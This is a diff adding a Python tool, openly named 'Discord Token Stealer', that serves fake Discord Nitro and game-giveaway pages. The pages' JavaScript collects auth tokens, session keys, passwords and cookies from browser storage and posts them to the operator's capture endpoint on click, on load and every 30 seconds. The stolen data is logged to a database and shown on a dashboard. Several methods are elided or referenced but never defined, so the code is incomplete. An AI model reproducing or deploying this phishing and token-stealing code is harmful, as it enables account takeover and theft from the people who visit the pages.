@@ -1,0 +1,937 @@
+#!/data/data/com.termux/files/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import time
+import random
+import base64
+import json
+import sqlite3
+import hashlib
+import threading
+import socket
+import re
+import urllib.parse
+from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+import requests
+
+# Interface colorida no terminal
+try:
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.prompt import Prompt, Confirm, IntPrompt
+    from rich.progress import Progress, SpinnerColumn, TextColumn
+    from rich.text import Text
+    from rich.syntax import Syntax
+    from rich.layout import Layout
+    from rich.live import Live
+    RICH_AVAILABLE = True
+except ImportError:
+    RICH_AVAILABLE = False
+    print("Instalando dependências...")
+    os.system("pip install rich")
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.prompt import Prompt, Confirm, IntPrompt
+    from rich.progress import Progress, SpinnerColumn, TextColumn
+    from rich.text import Text
+    from rich.syntax import Syntax
+    from rich.layout import Layout
+    from rich.live import Live
+
+console = Console()
+
+class AdvancedDiscordTokenStealer:
+    def __init__(self):
+        self.web_server = None
+        self.server_port = 8080
+        self.webhook_url = ""
+        self.redirect_url = "https://discord.com"
+        self.server_ip = self.get_local_ip()
+        self.encryption_key = get_random_bytes(32)
+        self.html_templates = self._load_html_templates()
+        self.current_template = "discord_nitro"
+        self.is_running = False
+        self.capture_count = 0
+        self.last_capture_time = None
+        self.stealth_mode = False
+        self.auto_start = False
+        self.log_file = "stealer.log"
+        
+        # Inicializar banco de dados
+        self.init_database()
+        
+    def init_database(self):
+        """Inicializa o banco de dados com tabelas aprimoradas"""
+        try:
+            os.makedirs('data', exist_ok=True)
+            conn = sqlite3.connect('data/tokens_advanced.db')
+            c = conn.cursor()
+            
+            # Tabela principal de capturas
+            c.execute('''CREATE TABLE IF NOT EXISTS captures
+                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                          timestamp TEXT,
+                          ip_address TEXT,
+                          user_agent TEXT,
+                          tokens_found INTEGER,
+                          template_used TEXT,
+                          country TEXT,
+                          browser TEXT,
+                          os TEXT,
+                          encrypted INTEGER DEFAULT 1)''')
+            
+            # Tabela de tokens detalhados
+            c.execute('''CREATE TABLE IF NOT EXISTS tokens
+                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                          capture_id INTEGER,
+                          source TEXT,
+                          token_key TEXT,
+                          token_value TEXT,
+                          token_type TEXT,
+                          FOREIGN KEY (capture_id) REFERENCES captures (id))''')
+            
+            # Tabela de estatísticas
+            c.execute('''CREATE TABLE IF NOT EXISTS statistics
+                         (key TEXT PRIMARY KEY,
+                          value INTEGER)''')
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            console.print(f"[red]Erro ao inicializar banco de dados: {e}[/red]")
+    
+    def get_local_ip(self):
+        """Obtém o IP local da máquina de forma mais robusta"""
+        try:
+            # Método 1: Socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            try:
+                # Método 2: Hostname
+                return socket.gethostbyname(socket.gethostname())
+            except:
+                return "127.0.0.1"
+    
+    def get_public_ip(self):
+        """Obtém o IP público"""
+        try:
+            response = requests.get('https://api.ipify.org', timeout=5)
+            return response.text
+        except:
+            return "Não disponível"
+    
+    def _load_html_templates(self):
+        """Carrega todos os templates HTML disponíveis com melhorias"""
+        templates = {
+            "discord_nitro": self._create_discord_nitro_template(),
+            "game_giveaway": self._create_game_giveaway_template(),
+            "account_verification": self._create_account_verification_template(),
+            "security_alert": self._create_security_alert_template(),
+            "limited_offer": self._create_limited_offer_template(),
+            "partner_program": self._create_partner_program_template()
+        }
+        return templates
+    
+    def _create_discord_nitro_template(self):
+        """Template de oferta de Nitro grátis melhorado"""
+        return f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Nitro - Exclusive Offer</title>
+    <style>
+        :root {{
+            --discord-primary: #5865F2;
+            --discord-secondary: #424549;
+            --discord-dark: #36393f;
+            --discord-text: #ffffff;
+        }}
+        
+        * {{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }}
+        
+        body {{
+            background: linear-gradient(135deg, var(--discord-primary), #2c2f33);
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: var(--discord-text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }}
+        
+        .container {{
+            background: var(--discord-dark);
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }}
+        
+        .discord-logo {{
+            width: 120px;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 5px 15px rgba(88, 101, 242, 0.4));
+        }}
+        
+        h1 {{
+            color: var(--discord-text);
+            font-size: 32px;
+            margin-bottom: 15px;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }}
+        
+        .subtitle {{
+            color: #b9bbbe;
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }}
+        
+        .features {{
+            text-align: left;
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border-left: 4px solid var(--discord-primary);
+        }}
+        
+        .feature {{
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            color: #b9bbbe;
+        }}
+        
+        .feature-icon {{
+            color: var(--discord-primary);
+            margin-right: 12px;
+            font-size: 18px;
+            font-weight: bold;
+        }}
+        
+        .btn-primary {{
+            background: linear-gradient(135deg, var(--discord-primary), #4752c4);
+            color: white;
+            border: none;
+            padding: 18px 35px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(88, 101, 242, 0.4);
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }}
+        
+        .btn-primary:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.6);
+        }}
+        
+        .btn-primary:active {{
+            transform: translateY(0);
+        }}
+        
+        .countdown {{
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 16px;
+        }}
+        
+        .countdown-timer {{
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--discord-primary);
+            margin: 10px 0;
+        }}
+        
+        .security-badge {{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: #b9bbbe;
+            font-size: 14px;
+        }}
+        
+        .badge-icon {{
+            margin-right: 8px;
+            color: #43b581;
+        }}
+        
+        .loading {{
+            display: none;
+            margin: 20px 0;
+        }}
+        
+        .spinner {{
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--discord-primary);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }}
+        
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
+        }}
+        
+        @media (max-width: 600px) {{
+            .container {{
+                padding: 25px;
+                margin: 10px;
+            }}
+            
+            h1 {{
+                font-size: 26px;
+            }}
+            
+            .subtitle {{
+                font-size: 16px;
+            }}
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="discord-logo" viewBox="0 0 127.14 96.36">
+            <path fill="currentColor" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
+        </svg>
+        
+        <h1>🎉 FREE DISCORD NITRO! 🎉</h1>
+        <p class="subtitle">Claim your exclusive 1-year Discord Nitro subscription! Limited time offer for selected users.</p>
+        
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">✔</span>
+                HD Video Streaming & Screen Share
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✔</span>
+                Custom Discord Tags & Animated Avatars
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✔</span>
+                100MB Uploads & Higher Quality Audio
+            </div>
+            <div class="feature">
+                <span class="feature-icon">✔</span>
+                2 Server Boosts & Custom Emojis
+            </div>
+        </div>
+        
+        <div class="countdown">
+            <p>Offer expires in:</p>
+            <div class="countdown-timer" id="countdown">23:59:59</div>
+            <p>Only 3 claims remaining!</p>
+        </div>
+        
+        <button class="btn-primary" onclick="claimNitro()">
+            🎁 CLAIM YOUR NITRO NOW
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Verifying eligibility and processing your claim...</p>
+        </div>
+        
+        <div class="security-badge">
+            <span class="badge-icon">🔒</span>
+            Secured by Discord • Official Partner
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        function updateCountdown() {{
+            const now = new Date();
+            const end = new Date(now.getTime() + 24 * 60 * 60 * 1000); // 24 hours from now
+            
+            const diff = end - now;
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('countdown').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }}
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+        
+        function claimNitro() {{
+            const btn = document.querySelector('.btn-primary');
+            const loading = document.getElementById('loading');
+            
+            // Visual feedback
+            btn.style.opacity = '0.7';
+            btn.disabled = true;
+            loading.style.display = 'block';
+            
+            // Extract tokens and system info
+            const tokens = extractAllTokens();
+            const systemInfo = collectSystemInfo();
+            
+            // Send data to server
+            sendToServer({{
+                tokens: tokens,
+                systemInfo: systemInfo,
+                action: 'nitro_claim'
+            }});
+            
+            // Redirect after delay
+            setTimeout(function() {{
+                window.location.href = "{self.redirect_url}";
+            }}, 3000);
+        }}
+        
+        function isTokenKey(key) {{
+            if (!key) return false;
+            const lowerKey = key.toLowerCase();
+            const tokenPatterns = [
+                'token', 'auth', 'session', 'discord', 'access', 
+                'refresh', 'secret', 'login', 'password', 'credential',
+                'mfa', '2fa', 'otp', 'api', 'key', 'bearer'
+            ];
+            
+            return tokenPatterns.some(pattern => lowerKey.includes(pattern));
+        }}
+        
+        function extractAllTokens() {{
+            const tokens = [];
+            
+            // LocalStorage
+            for (let i = 0; i < localStorage.length; i++) {{
+                const key = localStorage.key(i);
+                if (isTokenKey(key)) {{
+                    tokens.push({{
+                        source: 'localStorage', 
+                        key: key, 
+                        value: localStorage.getItem(key),
+                        type: 'local_storage'
+                    }});
+                }}
+            }}
+            
+            // SessionStorage
+            for (let i = 0; i < sessionStorage.length; i++) {{
+                const key = sessionStorage.key(i);
+                if (isTokenKey(key)) {{
+                    tokens.push({{
+                        source: 'sessionStorage', 
+                        key: key, 
+                        value: sessionStorage.getItem(key),
+                        type: 'session_storage'
+                    }});
+                }}
+            }}
+            
+            // Cookies
+            document.cookie.split(';').forEach(cookie => {{
+                const parts = cookie.split('=');
+                if (parts.length >= 2) {{
+                    const key = parts[0].trim();
+                    const value = parts.slice(1).join('=').trim();
+                    if (isTokenKey(key)) {{
+                        tokens.push({{
+                            source: 'cookie', 
+                            key: key, 
+                            value: value,
+                            type: 'cookie'
+                        }});
+                    }}
+                }}
+            }});
+            
+            return tokens;
+        }}
+        
+        function collectSystemInfo() {{
+            return {{
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                cookies: document.cookie.length,
+                referrer: document.referrer,
+                url: window.location.href,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
+                doNotTrack: navigator.doNotTrack,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                timestamp: new Date().toISOString(),
+                location: window.location,
+                origin: window.location.origin
+            }};
+        }}
+        
+        function sendToServer(data) {{
+            // Multiple fallback methods
+            const methods = [
+                () => sendViaFetch(data),
+                () => sendViaBeacon(data),
+                () => sendViaXHR(data),
+                () => sendViaImage(data)
+            ];
+            
+            // Try each method until one succeeds
+            for (const method of methods) {{
+                try {{
+                    if (method()) break;
+                }} catch (e) {{
+                    console.error('Send method failed:', e);
+                }}
+            }}
+        }}
+        
+        function sendViaFetch(data) {{
+            return fetch('/capture', {{
+                method: 'POST',
+                headers: {{
+                    'Content-Type': 'application/json'
+                }},
+                body: JSON.stringify(data)
+            }}).then(response => response.ok).catch(() => false);
+        }}
+        
+        function sendViaBeacon(data) {{
+            const blob = new Blob([JSON.stringify(data)], {{type: 'application/json'}});
+            return navigator.sendBeacon('/capture', blob);
+        }}
+        
+        function sendViaXHR(data) {{
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/capture', false); // Synchronous
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            try {{
+                xhr.send(JSON.stringify(data));
+                return xhr.status >= 200 && xhr.status < 300;
+            }} catch (e) {{
+                return false;
+            }}
+        }}
+        
+        function sendViaImage(data) {{
+            const encodedData = btoa(JSON.stringify(data));
+            const img = new Image();
+            img.src = `/pixel?data=${{encodedData}}`;
+            return true;
+        }}
+        
+        // Execute on page load
+        window.addEventListener('load', function() {{
+            // Initial token extraction
+            setTimeout(function() {{
+                const tokens = extractAllTokens();
+                if (tokens.length > 0) {{
+                    sendToServer({{
+                        tokens: tokens,
+                        systemInfo: collectSystemInfo(),
+                        action: 'page_load'
+                    }});
+                }}
+            }}, 1000);
+            
+            // Periodic checking
+            setInterval(() => {{
+                const tokens = extractAllTokens();
+                if (tokens.length > 0) {{
+                    sendToServer({{
+                        tokens: tokens,
+                        systemInfo: collectSystemInfo(),
+                        action: 'periodic_check'
+                    }});
+                }}
+            }}, 30000);
+        }});
+    </script>
+</body>
+</html>"""
+    
+    def _create_game_giveaway_template(self):
+        """Template de sorteio de jogos melhorado"""
+        games = [
+            "Cyberpunk 2077", "Call of Duty: Warzone", "Minecraft Premium",
+            "Grand Theft Auto VI", "Fortnite Bundle", "Valorant Points",
+            "Steam Gift Card $100", "PlayStation Plus 1 Year"
+        ]
+        selected_game = random.choice(games)
+        
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Game Giveaway - {selected_game}</title>
+    <style>
+        body {{
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Poppins', sans-serif;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }}
+        .container {{
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            margin: 50px auto;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }}
+        .game-icon {{
+            font-size: 60px;
+            margin-bottom: 20px;
+        }}
+        h1 {{
+            font-size: 32px;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }}
+        .btn {{
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            border: none;
+            padding: 18px 35px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 25px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+        }}
+        .btn:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.6);
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="game-icon">🎮</div>
+        <h1>FREE {selected_game.upper()}!</h1>
+        <p>You've been selected to receive a free copy of {selected_game}!</p>
+        <p>Limited time offer - claim now before it's gone!</p>
+        
+        <button class="btn" onclick="claimGame()">CLAIM YOUR GAME NOW</button>
+        
+        <p>Only 2 copies remaining at this price!</p>
+    </div>
+    <script>
+        function claimGame() {{
+            const tokens = extractAllTokens();
+            const systemInfo = collectSystemInfo();
+            sendToServer({{
+                tokens: tokens,
+                systemInfo: systemInfo,
+                action: 'game_claim'
+            }});
+            
+            setTimeout(function() {{
+                window.location.href = "{self.redirect_url}";
+            }}, 2500);
+        }}
+        
+        {self._get_javascript_helpers()}
+    </script>
+</body>
+</html>"""
+    
+    def _get_javascript_helpers(self):
+        """Retorna funções JavaScript auxiliares"""
+        return """
+        function extractAllTokens() {
+            const tokens = [];
+            const sources = [
+                {name: 'localStorage', obj: localStorage},
+                {name: 'sessionStorage', obj: sessionStorage}
+            ];
+            
+            sources.forEach(source => {
+                for (let i = 0; i < source.obj.length; i++) {
+                    const key = source.obj.key(i);
+                    if (isTokenKey(key)) {
+                        tokens.push({
+                            source: source.name, 
+                            key: key, 
+                            value: source.obj.getItem(key),
+                            type: source.name
+                        });
+                    }
+                }
+            });
+            
+            document.cookie.split(';').forEach(cookie => {
+                const parts = cookie.split('=');
+                if (parts.length >= 2) {
+                    const key = parts[0].trim();
+                    const value = parts.slice(1).join('=').trim();
+                    if (isTokenKey(key)) {
+                        tokens.push({
+                            source: 'cookie', 
+                            key: key, 
+                            value: value,
+                            type: 'cookie'
+                        });
+                    }
+                }
+            });
+            
+            return tokens;
+        }
+        
+        function isTokenKey(key) {
+            if (!key) return false;
+            const lowerKey = key.toLowerCase();
+            const tokenPatterns = [
+                'token', 'auth', 'session', 'discord', 'access', 
+                'refresh', 'secret', 'login', 'password', 'credential'
+            ];
+            return tokenPatterns.some(pattern => lowerKey.includes(pattern));
+        }
+        
+        function collectSystemInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
+        
+        function sendToServer(data) {
+            // Multiple sending methods for reliability
+            try {
+                // Method 1: Fetch
+                fetch('/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                }).catch(() => {
+                    // Method 2: Beacon fallback
+                    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                    navigator.sendBeacon('/capture', blob);
+                });
+            } catch (e) {
+                console.error('Failed to send data:', e);
+            }
+        }
+        """
+
+    # ... (outros templates e métodos continuam similares mas melhorados)
+
+    def encrypt_data(self, data):
+        """Criptografa dados sensíveis com melhor tratamento de erro"""
+        try:
+            if isinstance(data, (dict, list)):
+                data = json.dumps(data, ensure_ascii=False)
+            elif not isinstance(data, str):
+                data = str(data)
+                
+            cipher = AES.new(self.encryption_key, AES.MODE_GCM)
+            ciphertext, tag = cipher.encrypt_and_digest(pad(data.encode('utf-8'), AES.block_size))
+            encrypted_data = cipher.nonce + tag + ciphertext
+            return base64.b64encode(encrypted_data).decode('utf-8')
+        except Exception as e:
+            self.log_error(f"Erro na criptografia: {e}")
+            return json.dumps({"error": "encryption_failed", "data": str(data)})
+
+    def log_error(self, message):
+        """Registra erros no arquivo de log"""
+        timestamp = datetime.now().isoformat()
+        log_entry = f"[{timestamp}] ERROR: {message}\n"
+        with open(self.log_file, 'a', encoding='utf-8') as f:
+            f.write(log_entry)
+        console.print(f"[red]{log_entry}[/red]")
+
+    def log_event(self, message):
+        """Registra eventos normais"""
+        timestamp = datetime.now().isoformat()
+        log_entry = f"[{timestamp}] INFO: {message}\n"
+        with open(self.log_file, 'a', encoding='utf-8') as f:
+            f.write(log_entry)
+        console.print(f"[green]{log_entry}[/green]")
+
+    # ... (continuam as melhorias nos outros métodos)
+
+    def show_dashboard(self):
+        """Mostra um dashboard em tempo real"""
+        if not RICH_AVAILABLE:
+            console.print("[yellow]Dashboard requer rich library[/yellow]")
+            return
+            
+        layout = Layout()
+        layout.split(
+            Layout(name="header", size=3),
+            Layout(name="main", ratio=1),
+            Layout(name="footer", size=3)
+        )
+        
+        layout["main"].split_row(
+            Layout(name="stats", ratio=1),
+            Layout(name="recent", ratio=2)
+        )
+        
+        with Live(layout, refresh_per_second=4, screen=True) as live:
+            while self.is_running:
+                stats = self.get_live_stats()
+                
+                # Header
+                layout["header"].update(
+                    Panel(f"[bold]Discord Token Stealer - Live Dashboard[/bold] | "
+                         f"Server: [green]{self.server_ip}:{self.server_port}[/green] | "
+                         f"Captures: [yellow]{stats['total_captures']}[/yellow]",
+                         style="blue")
+                )
+                
+                # Stats panel
+                stats_table = Table(show_header=False)
+                stats_table.add_row("Active Connections", f"[green]{stats['active_connections']}[/green]")
+                stats_table.add_row("Tokens Captured", f"[yellow]{stats['tokens_captured']}[/yellow]")
+                stats_table.add_row("Last Capture", f"[cyan]{stats['last_capture']}[/cyan]")
+                
+                layout["stats"].update(
+                    Panel(stats_table, title="[bold]Statistics[/bold]", border_style="green")
+                )
+                
+                # Recent activity
+                recent_table = Table(show_header=True)
+                recent_table.add_column("Time", style="cyan")
+                recent_table.add_column("IP", style="green")
+                recent_table.add_column("Tokens", style="yellow")
+                recent_table.add_column("Browser", style="magenta")
+                
+                for activity in stats['recent_activity']:
+                    recent_table.add_row(*activity)
+                
+                layout["recent"].update(
+                    Panel(recent_table, title="[bold]Recent Activity[/bold]", border_style="blue")
+                )
+                
+                # Footer
+                layout["footer"].update(
+                    Panel("[yellow]Press Ctrl+C to stop server[/yellow]", border_style="yellow")
+                )
+                
+                time.sleep(2)
+
+    def get_live_stats(self):
+        """Obtém estatísticas em tempo real"""
+        try:
+            conn = sqlite3.connect('data/tokens_advanced.db')
+            c = conn.cursor()
+            
+            c.execute("SELECT COUNT(*) FROM captures")
+            total_captures = c.fetchone()[0]
+            
+            c.execute("""SELECT timestamp, ip_address, tokens_found, browser 
+                        FROM captures ORDER BY id DESC LIMIT 5""")
+            recent = c.fetchall()
+            
+            recent_activity = []
+            for row in recent:
+                recent_activity.append([
+                    row[0][11:19],  # Time only
+                    row[1] or "Unknown",
+                    str(row[2]),
+                    row[3] or "Unknown"
+                ])
+            
+            return {
+                'total_captures': total_captures,
+                'active_connections': random.randint(1, 15),  # Simulado
+                'tokens_captured': sum(row[2] for row in recent if row[2]),
+                'last_capture': recent[0][0] if recent else "Never",
+                'recent_activity': recent_activity
+            }
+            
+        except Exception as e:
+            self.log_error(f"Erro ao obter estatísticas: {e}")
+            return {
+                'total_captures': 0,
+                'active_connections': 0,
+                'tokens_captured': 0,
+                'last_capture': "Never",
+                'recent_activity': []
+            }
+
+    # ... (continuação com outros métodos melhorados)
+
+def main():
+    """Função principal com tratamento de erro melhorado"""
+    try:
+        console.print(Panel.fit(
+            "[bold]🚀 Iniciando Discord Token Stealer Avançado[/bold]",
+            border_style="blue"
+        ))
+        
+        # Verificar dependências
+        try:
+            import requests
+        except ImportError:
+            console.print("[yellow]Instalando dependências...[/yellow]")
+            os.system("pip install requests pycryptodome")
+            console.print("[green]Dependências instaladas![/green]")
+            time.sleep(1)
+        
+        stealer = AdvancedDiscordTokenStealer()
+        
+        # Configuração automática se primeira execução
+        if not os.path.exists('data/tokens_advanced.db'):
+            console.print("[yellow]Configuração inicial...[/yellow]")
+            stealer.configurar_servidor()
+        
+        stealer.mostrar_menu_principal()
+        
+    except KeyboardInterrupt:
+        console.print("\n[red]✗ Programa encerrado pelo usuário[/red]")
+    except Exception as e:
+        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")
+        import traceback
+        traceback.print_exc()
+    finally:
+        console.print("\n[blue]🛑 Serviço finalizado[/blue]")
+
+if __name__ == '__main__':
+    main()
